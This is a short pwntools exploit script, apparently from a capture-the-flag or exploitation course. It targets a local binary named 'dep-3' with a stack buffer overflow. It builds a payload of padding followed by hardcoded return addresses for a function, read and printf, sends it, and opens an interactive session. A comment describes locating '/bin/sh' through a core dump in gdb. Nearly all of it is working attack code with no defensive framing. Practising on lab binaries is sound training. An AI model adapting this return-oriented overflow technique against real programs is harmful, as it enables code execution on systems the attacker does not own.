#!/usr/bin/env python

from pwn import *

# create process and run the program
p = process("./dep-3")

somefunctionaddr = p32(0x08048894)
readaddr = p32(0x0806d2a0)
printfaddr = p32(0x0804ede0)

buff = "A" * 0x88 +"BBBB" + somefunctionaddr + readaddr + printfaddr + p32(0x00000003) + p32(0xffffd100) + p32(0x00000100)

'''
Generate a core by overflowing buffer and p.wait()
run
gdb -core ./core
then search '/bin/sh'
Then you have your address

'''

# send data with newline
p.sendline(buff)

#p.sendline("A" * 0x90)
#p.wait()


# open an interactive console to the program
p.interactive()